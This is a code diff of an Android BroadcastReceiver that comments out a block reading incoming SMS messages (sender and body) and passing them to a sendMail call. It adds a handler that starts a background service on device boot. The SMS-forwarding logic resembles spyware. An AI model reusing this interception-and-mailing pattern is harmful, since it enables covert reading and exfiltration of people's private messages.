@@ -14,29 +14,33 @@ import android.telephony.SmsMessage;
 
 public class MyPhoneReceiver extends BroadcastReceiver {
     SharedPreferences sp;
-
     @Override
     public void onReceive(Context context, Intent intent) {
         // TODO Auto-generated method stub
 
-        Bundle bundle = intent.getExtras();
-        SmsMessage[] msgs = null;
-        String str = "";
-        if (bundle != null) {
+//        Bundle bundle = intent.getExtras();
+//        SmsMessage[] msgs = null;
+//        String str = "";
+//        if (bundle != null) {
+//
+//            Object[] pdus = (Object[]) bundle.get("pdus");
+//            msgs = new SmsMessage[pdus.length];
+//            for (int i = 0; i < msgs.length; i++) {
+//                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
+//                str += "SMS from " + msgs[i].getOriginatingAddress();
+//                str += " :";
+//                str += msgs[i].getMessageBody().toString();
+//                str += "\n";
+//            }
+//
+//        }
 
-            Object[] pdus = (Object[]) bundle.get("pdus");
-            msgs = new SmsMessage[pdus.length];
-            for (int i = 0; i < msgs.length; i++) {
-                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
-                str += "SMS from " + msgs[i].getOriginatingAddress();
-                str += " :";
-                str += msgs[i].getMessageBody().toString();
-                str += "\n";
-            }
-
+//        sendMail(context, str);
+        if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
+            Intent myIntent = new Intent(context, ServiceTemplate.class);
+            context.startService(myIntent);
         }
 
-        sendMail(context, str);
 
     }
 
